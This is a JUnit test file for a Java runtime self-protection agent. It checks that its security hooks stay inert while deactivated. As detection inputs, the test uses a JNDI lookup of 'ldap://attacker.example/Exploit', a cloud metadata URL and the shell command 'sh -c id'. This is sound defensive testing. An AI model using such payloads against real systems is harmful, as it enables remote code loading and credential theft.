package io.ohmyrasp.agent.hook;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertSame;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import io.ohmyrasp.agent.log.JsonEventLogger;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.ObjectInputFilter;
import java.io.PrintStream;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Set;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

/**
 * Every entry the injected code calls asks {@link HookActivation#inactive} first and, while the hooks are off, does
 * what the uninstrumented code would: no detection, no event, no block, no request state. This is what keeps the
 * calls a failed start already injected inert (the start-failure tests show it in a real JVM).
 */
final class HookActivationTest {
  /** Public static methods of OhMyRaspHooks the injected code never calls: the agent's own callers use them. */
  private static final Set<String> AGENT_INTERNAL =
      Set.of("installPolicy", "currentRequest", "blockingEnabled", "isDangerousDeserialization");

  @AfterEach
  void hooksOnAgain() {
    HookActivation.activate();
    OhMyRaspHooks.reportTo(null);
    System.clearProperty("ohmyrasp.block");
  }

  @Test
  void everyPublicEntryChecksTheActivationFirst() throws Exception {
    List<String> unguarded = new ArrayList<>();
    unguarded.addAll(unguardedEntries(OhMyRaspHooks.class, AGENT_INTERNAL));
    unguarded.addAll(unguardedEntries(DeserializationGuard.class, Set.of()));
    assertEquals(List.of(), unguarded,
        "these public entries do not begin with HookActivation.inactive(), so injected calls to them would act "
            + "before a start commits and after a failed one");
  }

  @Test
  void whileTheHooksAreOffAnEntryThatWouldBlockDoesNothing(@TempDir Path dir) throws Exception {
    Path log = dir.resolve("events.jsonl");
    PrintStream console = new PrintStream(new ByteArrayOutputStream());
    OhMyRaspHooks.reportTo(JsonEventLogger.newForTesting(null, log.toString(), 0, true, console, console));
    System.setProperty("ohmyrasp.block", "true");
    URL metadata = new URL("http://169.254.169.254/latest/meta-data/");
    // The control: with the hooks on, the same calls are detections that are written, and a remote JNDI name blocks
    // outside a request too (an intrinsic finding; a metadata destination alone only logs there).
    assertThrows(OhMyRaspBlockException.class,
        () -> OhMyRaspHooks.beforeJndiLookup("ldap://attacker.example/Exploit"));
    assertTrue(Files.size(log) > 0, "the control detection was not written");
    Files.delete(log);
    OhMyRaspHooks.beforeUrlOpen(metadata);
    assertTrue(Files.exists(log) && Files.size(log) > 0, "the metadata control was not written");
    Files.delete(log);

    HookActivation.deactivate();
    assertTrue(HookActivation.inactive());
    OhMyRaspHooks.beforeUrlOpen(metadata);
    OhMyRaspHooks.beforeRuntimeExecString("sh -c id");
    OhMyRaspHooks.beforeJndiLookup("ldap://attacker.example/Exploit");

    assertFalse(Files.exists(log), "an inactive hook wrote an event");
  }

  @Test
  void whileTheHooksAreOffTheValueReturningEntriesReturnWhatTheApplicationWouldHave() {
    HookActivation.deactivate();
    Object request = new Request();
    assertTrue(OhMyRaspHooks.admitServletRequest(request, null), "an inactive admission admits");
    assertFalse(OhMyRaspHooks.currentRequest().active(), "an inactive admission opened a request");
    assertNull(OhMyRaspHooks.enterBodyRead(new Object()), "an inactive body read records nothing");
    assertNull(OhMyRaspHooks.enterBodyRead(new Object(), java.nio.ByteBuffer.allocate(4)),
        "an inactive buffer read records nothing");
    OhMyRaspHooks.abortBodyRead(new Object()); // inert: a token the recorder never gave is not even looked at
    assertNull(OhMyRaspHooks.beginGeneratedLines(Path.of("/tmp/x.sh")));
    Object value = new Object();
    assertSame(value, OhMyRaspHooks.jmxAttributeDisplayReceiver(value));
    assertFalse(OhMyRaspHooks.enforceElasticLz4Bounds());
    // The serial filter: no guard is installed, and the application's own filter alone decides.
    assertNull(DeserializationGuard.filterOrGuard(null));
    ObjectInputFilter rejectAll = info -> ObjectInputFilter.Status.REJECTED;
    assertSame(rejectAll, DeserializationGuard.filterOrGuard(rejectAll));
    assertEquals(ObjectInputFilter.Status.REJECTED, DeserializationGuard.checkInput(rejectAll, null, null));
    ObjectInputFilter allowAll = info -> ObjectInputFilter.Status.ALLOWED;
    assertEquals(ObjectInputFilter.Status.ALLOWED, DeserializationGuard.checkInput(allowAll, null));
  }

  @Test
  void theWarmUpThreadAloneSeesTheHooksBeforeTheyAreOn() throws Exception {
    HookActivation.deactivate();
    assertTrue(HookActivation.inactive());
    final boolean[] seen = new boolean[2];
    Thread warming = new Thread(() -> {
      HookActivation.beginWarmUp();
      try {
        seen[0] = HookActivation.inactive();
      } finally {
        HookActivation.endWarmUp();
      }
      seen[1] = HookActivation.inactive();
    });
    warming.start();
    warming.join();
    assertFalse(seen[0], "the warm-up thread did not see the hooks act");
    assertTrue(seen[1], "the hooks stayed on for the thread after its warm-up");
    assertTrue(HookActivation.inactive(), "another thread saw the hooks act during a warm-up");
  }

  /** The servlet request surface an admission reads, with nothing in it. */
  public static final class Request {
    public String getMethod() {
      return "GET";
    }

    public String getRequestURI() {
      return "/";
    }

    public String getQueryString() {
      return null;
    }

    public Map<String, String[]> getParameterMap() {
      return Map.of();
    }

    public java.util.Enumeration<String> getHeaderNames() {
      return java.util.Collections.emptyEnumeration();
    }

    public String getHeader(String name) {
      return null;
    }
  }

  /** The public static methods of {@code type} whose first instruction is not a call to HookActivation.inactive(). */
  static List<String> unguardedEntries(Class<?> type, Set<String> exempt) throws Exception {
    List<String> unguarded = new ArrayList<>();
    try (InputStream in = type.getResourceAsStream(type.getSimpleName() + ".class")) {
      new ClassReader(in).accept(new ClassVisitor(Opcodes.ASM9) {
        @Override
        public MethodVisitor visitMethod(int access, String name, String descriptor, String signature,
            String[] exceptions) {
          boolean entry = (access & Opcodes.ACC_PUBLIC) != 0 && (access & Opcodes.ACC_STATIC) != 0
              && (access & Opcodes.ACC_SYNTHETIC) == 0 && !exempt.contains(name);
          if (!entry) {
            return null;
          }
          return new MethodVisitor(Opcodes.ASM9) {
            private boolean first = true;
            private boolean guarded;

            private void instruction(boolean isGuard, boolean isReturn) {
              if (first) {
                first = false;
                // An empty body (a lone return) is already inert.
                guarded = isGuard || (isReturn && descriptor.endsWith(")V"));
              }
            }

            @Override public void visitMethodInsn(int op, String owner, String called, String desc, boolean itf) {
              instruction(op == Opcodes.INVOKESTATIC && owner.equals("io/ohmyrasp/agent/hook/HookActivation")
                  && called.equals("inactive"), false);
            }

            @Override public void visitInsn(int opcode) {
              instruction(false, opcode == Opcodes.RETURN);
            }

            @Override public void visitVarInsn(int opcode, int var) {
              instruction(false, false);
            }

            @Override public void visitFieldInsn(int opcode, String owner, String field, String desc) {
              instruction(false, false);
            }

            @Override public void visitTypeInsn(int opcode, String typeName) {
              instruction(false, false);
            }

            @Override public void visitLdcInsn(Object value) {
              instruction(false, false);
            }

            @Override public void visitIntInsn(int opcode, int operand) {
              instruction(false, false);
            }

            @Override public void visitJumpInsn(int opcode, org.objectweb.asm.Label label) {
              instruction(false, false);
            }

            @Override public void visitInvokeDynamicInsn(String n, String d, org.objectweb.asm.Handle h, Object... a) {
              instruction(false, false);
            }

            @Override public void visitEnd() {
              if (!guarded) {
                unguarded.add(type.getSimpleName() + "." + name + descriptor);
              }
            }
          };
        }
      }, ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES);
    }
    return unguarded;
  }
}
